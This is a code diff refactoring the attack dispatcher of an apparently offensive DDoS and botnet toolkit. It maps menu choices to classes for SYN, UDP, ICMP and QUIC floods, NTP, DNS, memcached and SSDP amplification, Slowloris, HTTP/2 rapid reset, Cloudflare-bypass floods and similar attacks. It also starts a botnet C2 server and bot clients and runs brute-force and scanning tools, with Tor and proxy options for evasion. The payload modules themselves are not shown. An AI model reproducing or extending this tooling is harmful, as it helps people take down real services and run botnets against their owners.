@@ -1,54 +1,87 @@
 import threading
 import asyncio
+from typing import Dict, Type, Optional, Any
+
 from src.utils import add_system_log, check_root_privileges
 from src.security import increment_thread_counter
-from src.attacks import (
-    http_flood, async_http_flood, syn_flood, udp_flood,
-    slowloris_attack, ntp_amplification, cloudflare_bypass_flood,
-    memcached_amplification, ssdp_amplification, dns_amplification,
-    rudy_attack, hoic_attack, http2_rapid_reset, apache_killer,
-    nginx_range_dos, port_scanner, network_scanner, ip_tracker,
-    adaptive_flood, vulnerability_scout, brute_force_suite,
-    domain_osint, proxy_autopilot, wifi_ghost, packet_insight,
-    payload_lab, identity_cloak, cve_explorer, web_exposure_sniper,
-    icmp_flood, ping_of_death, quic_flood, mixed_flood, slowpost_attack
+from src.attacks import * # Keep legacy imports for safety
+from src.attacks.base import AttackBase
+from src.attacks.layer7 import (
+    HTTPFloodAttack, StealthHTTPFloodAttack, AsyncHTTPFloodAttack, 
+    SlowlorisAttack, CloudflareBypassFloodAttack, RudyAttack, HoicAttack,
+    ApacheKillerAttack, NginxRangeDosAttack, Http2RapidResetAttack,
+    SlowPostAttack, AdaptiveFloodAttack, MixedFloodAttack
 )
-from src.attacks.layer7 import HTTPFloodAttack, StealthHTTPFloodAttack
+from src.attacks.l4 import (
+    SynFloodAttack, UdpFloodAttack, IcmpFloodAttack, 
+    PingOfDeathAttack, QuicFloodAttack, IcmpHybridAttack
+)
+from src.attacks.amplification import (
+    NtpAmplificationAttack, MemcachedAmplificationAttack,
+    SsdpAmplificationAttack, DnsAmplificationAttack
+)
 from src.utils.targets import target_mgmt
 from src.core.c2 import BotnetC2
 from src.core.menu import Menu
+from src.core.attack_manager import attack_manager
+from src.core.events import event_bus, Event, EventType
+
+
+class AttackRegistry:
+    """Registry of attack classes mapped to Menu choices"""
+    
+    _registry: Dict[str, Type[AttackBase]] = {
+        "1": StealthHTTPFloodAttack,
+        "2": AsyncHTTPFloodAttack,
+        "3": SynFloodAttack,
+        "4": UdpFloodAttack,
+        "5": SlowlorisAttack,
+        "6": NtpAmplificationAttack,
+        "8": CloudflareBypassFloodAttack,
+        "9": MemcachedAmplificationAttack,
+        "10": SsdpAmplificationAttack,
+        "11": DnsAmplificationAttack,
+        "12": RudyAttack,
+        "13": HoicAttack,
+        "14": Http2RapidResetAttack,
+        "15": ApacheKillerAttack,
+        "16": NginxRangeDosAttack,
+        "19": IcmpHybridAttack,
+        "22": AdaptiveFloodAttack,
+        "33": MixedFloodAttack,
+        "34": SlowPostAttack,
+        "35": QuicFloodAttack
+    }
+
+    @classmethod
+    def get_attack_class(cls, choice: str) -> Optional[Type[AttackBase]]:
+        return cls._registry.get(choice)
+
 
 class AttackDispatcher:
-    """Handles attack execution"""
+    """Handles attack execution via AttackManager and AttackRegistry"""
 
     @staticmethod
     def execute(choice, params, monitor=None):
-        """Execute the selected attack"""
+        """Execute the selected attack or management task"""
         try:
             attack_info = Menu.ATTACKS.get(choice)
             if not attack_info:
                 print("Invalid choice!")
                 return
 
-            if attack_info["needs_root"] and not check_root_privileges():
-                print(f"{attack_info['name']} requires root privileges!")
-                return
-
-            if params is None:
-                print("Invalid parameters provided!")
-                return
-
-            if choice == "7":
+            # Management & Non-DDOS Tasks
+            if choice == "7": # Botnet C2
                 c2_port = params.get("c2_port") or params.get("port") or 6667
                 c2 = BotnetC2(port=c2_port)
                 threading.Thread(target=c2.start_server, daemon=True).start()
                 return c2
 
-            if choice == "0":
+            if choice == "0": # Target Management
                 target_mgmt()
                 return
 
-            if choice == "18":
+            if choice == "18": # Bot Client
                 from src.bot import FullBot
                 c2_host = params.get("c2_host") or params.get("target") or "127.0.0.1"
                 c2_port = params.get("c2_port") or params.get("port") or 6667
@@ -56,184 +89,98 @@ class AttackDispatcher:
                 threading.Thread(target=bot.run, kwargs={'interactive': False}, daemon=True).start()
                 return bot
 
-            # Prepare target URL/IP
+            # Standard IP/DDOS Tools that aren't using AttackBase yet (Scanners, OSINT, etc.)
+            non_ddos_tools = {
+                "17": lambda: port_scanner(params["target"], params.get("port", "1-1024"), params["threads"], stealth=params.get("stealth_mode", True)),
+                "20": lambda: network_scanner(threads=params["threads"], subnet=params.get("subnet")),
+                "21": lambda: ip_tracker(params["target"] if "." in params["target"] else None),
+                "23": lambda: vulnerability_scout(params["target"]),
+                "24": lambda: brute_force_suite(params["target"], params.get("service", "ssh")),
+                "25": lambda: domain_osint(params["target"]),
+                "26": proxy_autopilot,
+                "27": wifi_ghost,
+                "28": lambda: packet_insight(duration=params["duration"]),
+                "29": payload_lab,
+                "30": identity_cloak,
+                "31": lambda: cve_explorer(params.get("keyword", params["target"])),
+                "32": lambda: web_exposure_sniper(params["target"])
+            }
+
+            if choice in non_ddos_tools:
+                add_system_log(f"[bold cyan]TOOL:[/] Launching {attack_info['name']}")
+                return non_ddos_tools[choice]()
+
+            # DDOS Attack Execution (Registry Pattern)
+            if attack_info["needs_root"] and not check_root_privileges():
+                print(f"{attack_info['name']} requires root privileges!")
+                return
+
+            attack_class = AttackRegistry.get_attack_class(choice)
+            if not attack_class:
+                add_system_log(f"[yellow]WARN:[/] Attack {choice} not yet migrated to class system")
+                # Fallback to legacy structure if needed, but we migrated most
+                return None
+
+            # Prepare parameters
             target = params["target"]
-            port = params.get("port", 0)
+            port = params.get("port", 80)
             duration = params["duration"]
             threads = params["threads"]
-            proxies = params["proxies"]
-            max_requests = params.get("max_requests", 0)
-
-            # Helper to format URL with port if needed
-            def get_formatted_url(target, port, scheme="http"):
-                if target.startswith("http"): return target
-                if port and ((scheme == "http" and port != 80) or (scheme == "https" and port != 443)):
-                    return f"{scheme}://{target}:{port}"
-                return f"{scheme}://{target}"
-
-            add_system_log(f"[bold red]LAUNCHING:[/] {attack_info['name']} against {target}")
             
-            if choice == "1":
-                url = get_formatted_url(target, port, "http")
-                attack = StealthHTTPFloodAttack(
-                    target=url,
-                    threads=threads,
-                    duration=duration,
-                    max_requests=max_requests,
-                    use_tor=params.get('use_tor', False),
-                    stealth_mode=params.get('stealth_mode', True),
-                    proxies=proxies,
-                    use_tls_client=True
-                )
+            add_system_log(f"[bold red]LAUNCHING:[/] {attack_info['name']} against {target}")
 
-                # Setup monitor callback for compatibility
-                if monitor:
-                    def update_monitor(state, metrics):
-                        if state == "running":
-                            monitor.packets_sent = metrics["packets_sent"]
-                            monitor.bytes_sent = metrics["bytes_sent"]
-                            monitor.failed = metrics.get("packets_failed", 0)
-                    attack.on_progress = update_monitor
+            # Create session in AttackManager
+            session = attack_manager.create_session(
+                attack_id=choice,
+                attack_name=attack_info["name"],
+                target=target,
+                config=params
+            )
 
-                attack.start()
-                return attack
+            # Special cases for constructor params
+            kwargs = {
+                "target": target,
+                "port": port,
+                "threads": threads,
+                "duration": duration
+            }
+            
+            # Map common params to class kwargs
+            if "max_requests" in params: kwargs["max_requests"] = params["max_requests"]
+            if "proxies" in params: kwargs["proxies"] = params["proxies"]
+            if "use_tor" in params: kwargs["use_tor"] = params["use_tor"]
+            if "stealth_mode" in params: kwargs["stealth_mode"] = params["stealth_mode"]
+            
+            # Additional custom params for specific attacks
+            if choice == "1": kwargs["use_tls_client"] = True
+            
+            # Create attack instance
+            try:
+                attack_inst = attack_class(**kwargs)
+            except TypeError as e:
+                # Handle cases where some attacks don't take all standard params
+                # Filter out irrelevant kwargs
+                import inspect
+                valid_params = inspect.signature(attack_class.__init__).parameters
+                filtered_kwargs = {k: v for k, v in kwargs.items() if k in valid_params}
+                attack_inst = attack_class(**filtered_kwargs)
 
-            elif choice == "2":
-                url = get_formatted_url(target, port, "https")
-                asyncio.run(async_http_flood(url, duration, proxies, monitor, max_requests, params.get('use_tor', False), params.get('stealth_mode', False)))
+            # Setup monitor for backward compatibility with HUD
+            if monitor:
+                def update_legacy_monitor(state, metrics):
+                    if state == "running":
+                        monitor.packets_sent = metrics["packets_sent"]
+                        monitor.bytes_sent = metrics["bytes_sent"]
+                        monitor.failed = metrics.get("packets_failed", 0)
+                attack_inst.on_progress = update_legacy_monitor
 
-            elif choice == "3":
-                for _ in range(threads):
-                    increment_thread_counter()
-                    threading.Thread(target=syn_flood, args=(target, port, duration, monitor, max_requests), daemon=True).start()
-
-            elif choice == "4":
-                for _ in range(threads):
-                    increment_thread_counter()
-                    threading.Thread(target=udp_flood, args=(target, port, duration, monitor, max_requests), daemon=True).start()
-
-            elif choice == "5":
-                increment_thread_counter()
-                threading.Thread(target=slowloris_attack, args=(target, port, duration, threads), daemon=True).start()
-
-            elif choice == "6":
-                increment_thread_counter()
-                threading.Thread(target=ntp_amplification, args=(target, duration, monitor), daemon=True).start()
-
-            elif choice == "8":
-                url = get_formatted_url(target, port, "https")
-                increment_thread_counter()
-                threading.Thread(target=cloudflare_bypass_flood, args=(url, duration, proxies, monitor, max_requests, params.get('use_tor', False), params.get('stealth_mode', False)), daemon=True).start()
-
-            elif choice == "9":
-                increment_thread_counter()
-                threading.Thread(target=memcached_amplification, args=(target, duration, monitor), daemon=True).start()
-
-            elif choice == "10":
-                increment_thread_counter()
-                threading.Thread(target=ssdp_amplification, args=(target, duration, monitor), daemon=True).start()
-
-            elif choice == "11":
-                increment_thread_counter()
-                threading.Thread(target=dns_amplification, args=(target, duration, monitor), daemon=True).start()
-
-            elif choice == "12":
-                url = get_formatted_url(target, port, "http")
-                increment_thread_counter()
-                threading.Thread(target=rudy_attack, args=(url, duration, threads, monitor), daemon=True).start()
-
-            elif choice == "13":
-                url = get_formatted_url(target, port, "https")
-                increment_thread_counter()
-                threading.Thread(target=hoic_attack, args=(url, duration, monitor), daemon=True).start()
-
-            elif choice == "14":
-                url = get_formatted_url(target, port, "https")
-                increment_thread_counter()
-                threading.Thread(target=http2_rapid_reset, args=(url, duration, monitor), daemon=True).start()
-
-            elif choice == "15":
-                url = get_formatted_url(target, port, "https")
-                increment_thread_counter()
-                threading.Thread(target=apache_killer, args=(url, duration, monitor), daemon=True).start()
-
-            elif choice == "16":
-                url = get_formatted_url(target, port, "https")
-                increment_thread_counter()
-                threading.Thread(target=nginx_range_dos, args=(url, duration, monitor), daemon=True).start()
-
-            elif choice == "17":
-                ports = params.get("ports") or params.get("port") or "1-1024"
-                stealth = params.get("stealth_mode", True)
-                port_scanner(target, ports, threads, stealth=stealth)
-
-            elif choice == "19":
-                # Hybrid ICMP attack: Run both in parallel
-                increment_thread_counter()
-                threading.Thread(target=ping_of_death, args=(target, duration, monitor), daemon=True).start()
-                for _ in range(threads):
-                    increment_thread_counter()
-                    threading.Thread(target=icmp_flood, args=(target, duration, monitor), daemon=True).start()
-
-            elif choice == "20":
-                network_scanner(threads=threads, subnet=params.get("subnet"))
-
-            elif choice == "21":
-                ip_tracker(target if "." in target else None)
-
-            elif choice == "22":
-                url = get_formatted_url(target, port, "https")
-                increment_thread_counter()
-                threading.Thread(target=adaptive_flood, args=(url, duration, proxies, monitor), daemon=True).start()
-
-            elif choice == "23":
-                url = get_formatted_url(target, port, "http")
-                vulnerability_scout(url)
-
-            elif choice == "24":
-                brute_force_suite(target, params.get("service", "ssh"))
-
-            elif choice == "25":
-                domain_osint(target)
-
-            elif choice == "26":
-                proxy_autopilot()
-
-            elif choice == "27":
-                wifi_ghost()
-
-            elif choice == "28":
-                packet_insight(duration=duration)
-
-            elif choice == "29":
-                payload_lab()
-
-            elif choice == "30":
-                identity_cloak()
-
-            elif choice == "31":
-                cve_explorer(params.get("keyword", target))
-
-            elif choice == "32":
-                url = get_formatted_url(target, port, "http")
-                web_exposure_sniper(url)
-
-            elif choice == "33":
-                url = get_formatted_url(target, port, "http")
-                for _ in range(threads):
-                    increment_thread_counter()
-                    threading.Thread(target=mixed_flood, args=(url, duration, proxies, monitor), daemon=True).start()
-
-            elif choice == "34":
-                url = get_formatted_url(target, port, "http")
-                slowpost_attack(url, duration, monitor)
-
-            elif choice == "35":
-                for _ in range(threads):
-                    increment_thread_counter()
-                    threading.Thread(target=quic_flood, args=(target, port, duration, monitor), daemon=True).start()
+            # Start via Manager
+            attack_manager.start_session(session.id, attack_inst)
+            return attack_inst
 
         except Exception as e:
-            print(f"[ERROR] Failed to execute attack {choice}: {str(e)}")
-            add_system_log(f"[bold red]ERROR:[/] Attack {choice} failed: {str(e)}")
+            add_system_log(f"[bold red]ERROR:[/] Dispatcher failed for {choice}: {str(e)}")
+            import traceback
+            traceback.print_exc()
             return None
+
